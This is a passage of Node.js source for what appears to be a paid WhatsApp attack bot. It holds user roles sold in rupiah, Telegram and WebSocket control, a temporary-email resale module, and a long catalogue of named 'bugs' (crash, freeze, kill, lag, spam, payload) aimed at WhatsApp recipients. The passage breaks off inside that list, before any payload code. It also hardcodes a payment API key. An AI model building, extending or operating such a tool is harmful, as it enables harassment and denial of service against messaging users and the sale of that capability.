async function main() {

const fs = require("fs");
const path = require('path');

const biz = {};   // WA Business socket registry

const activeConnections = {};

const telegramDataPath = "telegram.json";
const dbPath = "database.json";
    
const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

// ── STARTUP: Generate pairId untuk semua user yang belum punya ───────────────
(function generateAllPairIds() {
  try {
    const db = loadDatabase();
    let changed = false;
    for (let i = 0; i < db.length; i++) {
      if (!db[i].pairId) {
        db[i].pairId = genPairId();
        changed = true;
        console.log(`[STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`);
      }
    }
    if (changed) {
      saveDatabase(db);
      console.log(`[STARTUP] pairId generation done for ${db.filter(u => u.pairId).length} users`);
    } else {
      console.log(`[STARTUP] All users already have pairId`);
    }
  } catch(e) {
    console.error('[STARTUP] pairId generation error:', e.message);
  }
})();



process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestWaWebVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");

const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const nodemailer = require('nodemailer');
const { simpleParser } = require('mailparser');
const cheerio = require('cheerio');   // ← BUG FIX #1 dari review
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const ROLE_PRICES = {
  'member_40': 10000,        // Member / 40day → Rp10K
  'member_permanen': 15000,  // Member / Permanen → Rp15K
  'owner_40': 30000,         // Owner / 40day → Rp30K
  'owner_permanen': 37000,   // Owner / Permanen → Rp37K
  'admin_40': 20000,         // Admin / 40day → Rp20K
  'admin_permanen': 27000,   // Admin / Permanen → Rp27K
  'reseller_40': 18000,      // Reseller / 40day → Rp18K
  'reseller_permanen': 24000,// Reseller / Permanen → Rp24K
};

const ROLE_DURATION = {
  'member_40': 40,
  'member_permanen': 9999,
  'owner_40': 40,
  'owner_permanen': 9999,
  'admin_40': 40,
  'admin_permanen': 9999,
  'reseller_40': 40,
  'reseller_permanen': 9999,
};

const ROLE_NAME = {
  'member_40': 'member',
  'member_permanen': 'member',
  'owner_40': 'owner',
  'owner_permanen': 'owner',
  'admin_40': 'admin',
  'admin_permanen': 'admin',
  'reseller_40': 'reseller',
  'reseller_permanen': 'reseller',
};
const XENTRA_API_KEY = 'XentraPay_22501d17ec3446fc';
const XENTRA_BASE = 'https://app.xentrapay.xyz/api';
let activeKeys = {};


const EMAIL_DB     = './email_accounts.json';
const EMAIL_RATE   = {};
const EMAIL_POLL_MS = 15000;

function loadEmailDB() {
  try { return JSON.parse(fs.readFileSync(EMAIL_DB, 'utf8')); }
  catch { return {}; }
}
function saveEmailDB(data) {
  fs.writeFileSync(EMAIL_DB, JSON.stringify(data, null, 2));
}

function checkEmailRate(username, max = 10, windowMs = 60000) {
  const now = Date.now();
  if (!EMAIL_RATE[username]) EMAIL_RATE[username] = [];
  EMAIL_RATE[username] = EMAIL_RATE[username].filter(t => now - t < windowMs);
  if (EMAIL_RATE[username].length >= max) return false;
  EMAIL_RATE[username].push(now);
  return true;
}

// ── mail.tm API wrapper ────────────────────────────────────────
async function mailtm_getDomains() {
  const r = await axios.get('https://api.mail.tm/domains');
  return r.data['hydra:member'] || [];
}
async function mailtm_createAccount(address, password) {
  const r = await axios.post('https://api.mail.tm/accounts',
    { address, password },
    { headers: { 'Content-Type': 'application/json' } }
  );
  return r.data;
}
async function mailtm_getToken(address, password) {
  const r = await axios.post('https://api.mail.tm/token',
    { address, password },
    { headers: { 'Content-Type': 'application/json' } }
  );
  return r.data.token;
}
async function mailtm_listMessages(token) {
  const r = await axios.get('https://api.mail.tm/messages',
    { headers: { Authorization: `Bearer ${token}` } }
  );
  return r.data['hydra:member'] || [];
}
async function mailtm_readMessage(token, id) {
  const r = await axios.get(`https://api.mail.tm/messages/${id}`,
    { headers: { Authorization: `Bearer ${token}` } }
  );
  return r.data;
}
async function mailtm_deleteAccount(token, id) {
  const r = await axios.delete(`https://api.mail.tm/accounts/${id}`,
    { headers: { Authorization: `Bearer ${token}` } }
  );
  return r.status === 204;
}

// ── Auto-refresh token kalau expired ───────────────────────────
async function ensureMailToken(acc) {
  try {
    await mailtm_listMessages(acc.token);
    return acc.token;
  } catch (e) {
    const newToken = await mailtm_getToken(acc.address, acc.password);
    acc.token = newToken;
    return newToken;
  }
}

console.log('[📧 EMAIL] Module loaded. Provider: mail.tm + SMTP');

// ═════════════════════════════════════════════════
// EMAIL PREMIUM PLANS
// ══════════════════════════════════════════════════════════════
const EMAIL_PLANS = {
  free:     { name: 'Free',     price: 0,      maxEmails: 1,   maxMessages: 20,  retentionDays: 1,   smtpSend: false, customDomain: false, apiAccess: false, reseller: false },
  starter:  { name: 'Starter',  price: 15000,  maxEmails: 5,   maxMessages: 100, retentionDays: 7,   smtpSend: false, customDomain: false, apiAccess: false, reseller: false },
  pro:      { name: 'Pro',      price: 50000,  maxEmails: 25,  maxMessages: -1,  retentionDays: 30,  smtpSend: true,  customDomain: false, apiAccess: true,  reseller: false },
  business: { name: 'Business', price: 150000, maxEmails: 100, maxMessages: -1,  retentionDays: 90,  smtpSend: true,  customDomain: true,  apiAccess: true,  reseller: true },
  reseller: { name: 'Reseller', price: 500000, maxEmails: -1,  maxMessages: -1,  retentionDays: 365, smtpSend: true,  customDomain: true,  apiAccess: true,  reseller: true }
};

const EMAIL_SUBS_DB = './email_subscriptions.json';
function loadEmailSubs() {
  try { return JSON.parse(fs.readFileSync(EMAIL_SUBS_DB, 'utf8')); }
  catch { return {}; }
}
function saveEmailSubs(data) {
  fs.writeFileSync(EMAIL_SUBS_DB, JSON.stringify(data, null, 2));
}

function getEmailPlan(username) {
  const subs = loadEmailSubs();
  const sub = subs[username];
  if (!sub) return { plan: 'free', ...EMAIL_PLANS.free, expiredAt: null };
  if (sub.expiredAt && new Date(sub.expiredAt) < new Date()) {
    return { plan: 'free', ...EMAIL_PLANS.free, expiredAt: sub.expiredAt, expired: true };
  }
  return { plan: sub.plan, ...EMAIL_PLANS[sub.plan], expiredAt: sub.expiredAt };
}

function checkEmailQuota(username) {
  const plan = getEmailPlan(username);
  const db = loadEmailDB();
  const userEmails = db[username] || [];
  if (plan.maxEmails !== -1 && userEmails.length >= plan.maxEmails) {
    return { ok: false, reason: `Kuota email habis (${userEmails.length}/${plan.maxEmails}). Upgrade paket!` };
  }
  return { ok: true, plan, used: userEmails.length };
}

// ══════════════════════════════════════════════════════════════
// EMAIL ACCESS — Whitelist Approval System
// ══════════════════════════════════════════════════════════════
const EMAIL_ACCESS_DB = './email_access.json';
function loadEmailAccess() {
  try { return JSON.parse(fs.readFileSync(EMAIL_ACCESS_DB, 'utf8')); }
  catch { return {}; }
}
function saveEmailAccess(data) {
  fs.writeFileSync(EMAIL_ACCESS_DB, JSON.stringify(data, null, 2));
}

function canAccessEmail(username) {
  // Owner/Dev selalu allowed
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (user && ['owner', 'dev'].includes((user.role || '').toLowerCase())) {
    return { allowed: true, entry: { status: 'approved', setBy: 'system' } };
  }

  const access = loadEmailAccess();
  const entry = access[username];

  if (!entry) return { allowed: false, reason: 'not_approved', message: 'Akun lo belum di-approve Dev. Klik "Request Akses" buat minta approve.' };
  if (entry.status === 'approved') return { allowed: true, entry };
  if (entry.status === 'rejected') return { allowed: false, reason: 'rejected', message: 'Request lo di-reject. Hubungi Dev.' };
  if (entry.status === 'pending') return { allowed: false, reason: 'pending', message: 'Request lo masih dalam review Dev.' };
  if (entry.status === 'banned') return { allowed: false, reason: 'banned', message: 'Akun lo di-ban dari fitur email.' };
  return { allowed: false, reason: 'unknown', message: 'Status akses gak diketahui.' };
}

function setEmailAccess(username, status, setBy) {
  const access = loadEmailAccess();
  access[username] = {
    status,
    setBy: setBy || 'system',
    setAt: new Date().toISOString(),
    previousStatus: access[username]?.status || null
  };
  saveEmailAccess(access);
  return access[username];
}

function requestEmailAccess(username) {
  const access = loadEmailAccess();
  if (access[username]?.status === 'approved') return access[username];
  access[username] = {
    status: 'pending',
    requestedAt: new Date().toISOString(),
    setBy: 'user'
  };
  saveEmailAccess(access);
  return access[username];
}

// ══════════════════════════════════════════════════════════════
// EMAIL — Active Account Tracking (Multi-Account Switcher)
// ══════════════════════════════════════════════════════════════
const ACTIVE_EMAIL_DB = './active_emails.json';
function loadActiveEmails() {
  try { return JSON.parse(fs.readFileSync(ACTIVE_EMAIL_DB, 'utf8')); }
  catch { return {}; }
}
function saveActiveEmails(data) {
  fs.writeFileSync(ACTIVE_EMAIL_DB, JSON.stringify(data, null, 2));
}
function getActiveEmail(username) {
  const active = loadActiveEmails();
  return active[username] || null;
}
function setActiveEmail(username, address) {
  const active = loadActiveEmails();
  active[username] = address;
  saveActiveEmails(active);
}

// ══════════════════════════════════════════════════════════════
// EMAIL — Manual Payment Storage
// ══════════════════════════════════════════════════════════════
const MANUAL_PAYMENTS_FILE = './manual_payments.json';
function loadManualPayments() {
  try { return JSON.parse(fs.readFileSync(MANUAL_PAYMENTS_FILE, 'utf8')); }
  catch { return []; }
}
function saveManualPayments(data) {
  fs.writeFileSync(MANUAL_PAYMENTS_FILE, JSON.stringify(data, null, 2));
}

console.log('[💰 EMAIL] Plans + Access + Active + ManualPay loaded');
const KEY_FILE = path.join(__dirname, 'keyList.json');

const bugs = [
  // ── 20 lama ──
  { bug_id: "silentkill",       bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐂𝐇𝐀𝐓" },
  { bug_id: "blank",        bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐔𝐈" },
  { bug_id: "Enigma",       bug_name: "𝐄𝐍𝐈𝐆𝐌𝐀" },
  { bug_id: "album",        bug_name: "𝐀𝐋𝐁𝐔𝐌 𝐍𝐔𝐊𝐄" },
  { bug_id: "protocol",     bug_name: "𝐗" },
  { bug_id: "payment",      bug_name: "𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐗" },
  { bug_id: "interactive",  bug_name: "𝐔𝐈 𝐎𝐕𝐄𝐑𝐋𝐎𝐀𝐃" },
  { bug_id: "sticker",      bug_name: "𝐄𝐍𝐓𝐎𝐃 𝐔𝐈" },
  { bug_id: "status",       bug_name: "𝐒𝐓𝐀𝐓𝐔𝐒 𝐗" },
  { bug_id: "call",         bug_name: "𝐂𝐀𝐋𝐋 𝐗" },
  { bug_id: "newsletter",   bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑" },
  { bug_id: "mention",      bug_name: "𝐌𝐄𝐍𝐓𝐈𝐎𝐍 𝐌𝐀𝐒𝐒" },
  { bug_id: "poll",         bug_name: "𝐒𝐄𝐏𝐎𝐍𝐆 𝐔𝐈" },
  { bug_id: "doc",          bug_name: "𝐃𝐎𝐂 𝐍𝐔𝐋𝐋" },
  { bug_id: "location",     bug_name: "𝐗 𝐊𝐈𝐋𝐋𝐄𝐑" },
  { bug_id: "reaction",     bug_name: "𝐇𝐀𝐃𝐈𝐀𝐇 𝐅𝐎𝐑 𝐘𝐎𝐔😹" },
  { bug_id: "receipt",      bug_name: "𝐑𝐄𝐂𝐄𝐈𝐏𝐓 𝐗" },
  { bug_id: "button",       bug_name: "𝐁𝐔𝐓𝐓𝐎𝐍 𝐗" },
  { bug_id: "nested",       bug_name: "𝐍𝐄𝐒𝐓𝐄𝐃 𝐗" },
  { bug_id: "combo",        bug_name: "𝐂𝐎𝐌𝐁𝐎 𝐀𝐋𝐋" },

  // ── 100 baru: FREEZE ──
  { bug_id: "freeze1",  bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟏" },
  { bug_id: "freeze2",  bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟐" },
  { bug_id: "freeze3",  bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟑" },
  { bug_id: "freeze4",  bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟒" },
  { bug_id: "freeze5",  bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟓" },
  { bug_id: "freeze6",  bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟔" },
  { bug_id: "freeze7",  bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟕" },
  { bug_id: "freeze8",  bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟖" },
  { bug_id: "freeze9",  bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟗" },
  { bug_id: "freeze10", bug_name: "𝐅𝐑𝐄𝐄𝐙𝐄 𝐗𝟏𝟎" },

  // ── BLANK ──
  { bug_id: "blank1",  bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟏" },
  { bug_id: "blank2",  bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟐" },
  { bug_id: "blank3",  bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟑" },
  { bug_id: "blank4",  bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟒" },
  { bug_id: "blank5",  bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟓" },
  { bug_id: "blank6",  bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟔" },
  { bug_id: "blank7",  bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟕" },
  { bug_id: "blank8",  bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟖" },
  { bug_id: "blank9",  bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟗" },
  { bug_id: "blank10", bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐗𝟏𝟎" },

  // ── CRASH ──
  { bug_id: "crash1",  bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟏" },
  { bug_id: "crash2",  bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟐" },
  { bug_id: "crash3",  bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟑" },
  { bug_id: "crash4",  bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟒" },
  { bug_id: "crash5",  bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟓" },
  { bug_id: "crash6",  bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟔" },
  { bug_id: "crash7",  bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟕" },
  { bug_id: "crash8",  bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟖" },
  { bug_id: "crash9",  bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟗" },
  { bug_id: "crash10", bug_name: "𝐂𝐑𝐀𝐒𝐇 𝐗𝟏𝟎" },

  // ── LAG ──
  { bug_id: "lag1",  bug_name: "𝐋𝐀𝐆 𝐗𝟏" },
  { bug_id: "lag2",  bug_name: "𝐋𝐀𝐆 𝐗𝟐" },
  { bug_id: "lag3",  bug_name: "𝐋𝐀𝐆 𝐗𝟑" },
  { bug_id: "lag4",  bug_name: "𝐋𝐀𝐆 𝐗𝟒" },
  { bug_id: "lag5",  bug_name: "𝐋𝐀𝐆 𝐗𝟓" },
  { bug_id: "lag6",  bug_name: "𝐋𝐀𝐆 𝐗𝟔" },
  { bug_id: "lag7",  bug_name: "𝐋𝐀𝐆 𝐗𝟕" },
  { bug_id: "lag8",  bug_name: "𝐋𝐀𝐆 𝐗𝟖" },
  { bug_id: "lag9",  bug_name: "𝐋𝐀𝐆 𝐗𝟗" },
  { bug_id: "lag10", bug_name: "𝐋𝐀𝐆 𝐗𝟏𝟎" },

  // ── SPAM ──
  { bug_id: "spam1",  bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟏" },
  { bug_id: "spam2",  bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟐" },
  { bug_id: "spam3",  bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟑" },
  { bug_id: "spam4",  bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟒" },
  { bug_id: "spam5",  bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟓" },
  { bug_id: "spam6",  bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟔" },
  { bug_id: "spam7",  bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟕" },
  { bug_id: "spam8",  bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟖" },
  { bug_id: "spam9",  bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟗" },
  { bug_id: "spam10", bug_name: "𝐒𝐏𝐀𝐌 𝐗𝟏𝟎" },

  // ── KILL ──
  { bug_id: "kill1",  bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟏" },
  { bug_id: "kill2",  bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟐" },
  { bug_id: "kill3",  bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟑" },
  { bug_id: "kill4",  bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟒" },
  { bug_id: "kill5",  bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟓" },
  { bug_id: "kill6",  bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟔" },
  { bug_id: "kill7",  bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟕" },
  { bug_id: "kill8",  bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟖" },
  { bug_id: "kill9",  bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟗" },
  { bug_id: "kill10", bug_name: "𝐊𝐈𝐋𝐋 𝐗𝟏𝟎" },

  // ── CAROUSEL ──
  { bug_id: "carousel1",  bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟏" },
  { bug_id: "carousel2",  bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟐" },
  { bug_id: "carousel3",  bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟑" },
  { bug_id: "carousel4",  bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟒" },
  { bug_id: "carousel5",  bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟓" },
  { bug_id: "carousel6",  bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟔" },
  { bug_id: "carousel7",  bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟕" },
  { bug_id: "carousel8",  bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟖" },
  { bug_id: "carousel9",  bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟗" },
  { bug_id: "carousel10", bug_name: "𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋 𝐗𝟏𝟎" },

  // ── STICKER ──
  { bug_id: "sticker1",  bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟏" },
  { bug_id: "sticker2",  bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟐" },
  { bug_id: "sticker3",  bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟑" },
  { bug_id: "sticker4",  bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟒" },
  { bug_id: "sticker5",  bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟓" },
  { bug_id: "sticker6",  bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟔" },
  { bug_id: "sticker7",  bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟕" },
  { bug_id: "sticker8",  bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟖" },
  { bug_id: "sticker9",  bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟗" },
  { bug_id: "sticker10", bug_name: "𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐗𝟏𝟎" },

  // ── CALL ──
  { bug_id: "call1",  bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟏" },
  { bug_id: "call2",  bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟐" },
  { bug_id: "call3",  bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟑" },
  { bug_id: "call4",  bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟒" },
  { bug_id: "call5",  bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟓" },
  { bug_id: "call6",  bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟔" },
  { bug_id: "call7",  bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟕" },
  { bug_id: "call8",  bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟖" },
  { bug_id: "call9",  bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟗" },
  { bug_id: "call10", bug_name: "𝐂𝐀𝐋𝐋 𝐗𝟏𝟎" },

  // ── PAYLOAD ──
  { bug_id: "payload1",  bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟏" },
  { bug_id: "payload2",  bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟐" },
  { bug_id: "payload3",  bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟑" },
  { bug_id: "payload4",  bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟒" },
  { bug_id: "payload5",  bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟓" },
  { bug_id: "payload6",  bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟔" },
  { bug_id: "payload7",  bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟕" },
  { bug_id: "payload8",  bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟖" },
  { bug_id: "payload9",  bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟗" },
  { bug_id: "payload10", bug_name: "𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐗𝟏𝟎" },

  // ── Batch 2: STANZA ──
{ bug_id: "stanza1", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟏" }, { bug_id: "stanza2", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟐" },
{ bug_id: "stanza3", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟑" }, { bug_id: "stanza4", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟒" },
{ bug_id: "stanza5", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟓" }, { bug_id: "stanza6", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟔" },
{ bug_id: "stanza7", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟕" }, { bug_id: "stanza8", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟖" },
{ bug_id: "stanza9", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟗" }, { bug_id: "stanza10", bug_name: "𝐒𝐓𝐀𝐍𝐙𝐀 𝐗𝟏𝟎" },

// ── MEDIA ──
{ bug_id: "media1", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟏" }, { bug_id: "media2", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟐" },
{ bug_id: "media3", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟑" }, { bug_id: "media4", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟒" },
{ bug_id: "media5", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟓" }, { bug_id: "media6", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟔" },
{ bug_id: "media7", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟕" }, { bug_id: "media8", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟖" },
{ bug_id: "media9", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟗" }, { bug_id: "media10", bug_name: "𝐌𝐄𝐃𝐈𝐀 𝐗𝟏𝟎" },

// ── PRESENCE ──
{ bug_id: "presence1", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟏" }, { bug_id: "presence2", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟐" },
{ bug_id: "presence3", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟑" }, { bug_id: "presence4", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟒" },
{ bug_id: "presence5", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟓" }, { bug_id: "presence6", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟔" },
{ bug_id: "presence7", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟕" }, { bug_id: "presence8", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟖" },
{ bug_id: "presence9", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟗" }, { bug_id: "presence10", bug_name: "𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 𝐗𝟏𝟎" },

// ── GROUP ──
{ bug_id: "group1", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟏" }, { bug_id: "group2", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟐" },
{ bug_id: "group3", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟑" }, { bug_id: "group4", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟒" },
{ bug_id: "group5", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟓" }, { bug_id: "group6", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟔" },
{ bug_id: "group7", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟕" }, { bug_id: "group8", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟖" },
{ bug_id: "group9", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟗" }, { bug_id: "group10", bug_name: "𝐆𝐑𝐎𝐔𝐏 𝐗𝟏𝟎" },

// ── CRYPTO ──
{ bug_id: "crypto1", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟏" }, { bug_id: "crypto2", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟐" },
{ bug_id: "crypto3", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟑" }, { bug_id: "crypto4", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟒" },
{ bug_id: "crypto5", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟓" }, { bug_id: "crypto6", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟔" },
{ bug_id: "crypto7", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟕" }, { bug_id: "crypto8", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟖" },
{ bug_id: "crypto9", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟗" }, { bug_id: "crypto10", bug_name: "𝐂𝐑𝐘𝐏𝐓𝐎 𝐗𝟏𝟎" },

// ── BUSINESS ──
{ bug_id: "business1", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟏" }, { bug_id: "business2", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟐" },
{ bug_id: "business3", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟑" }, { bug_id: "business4", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟒" },
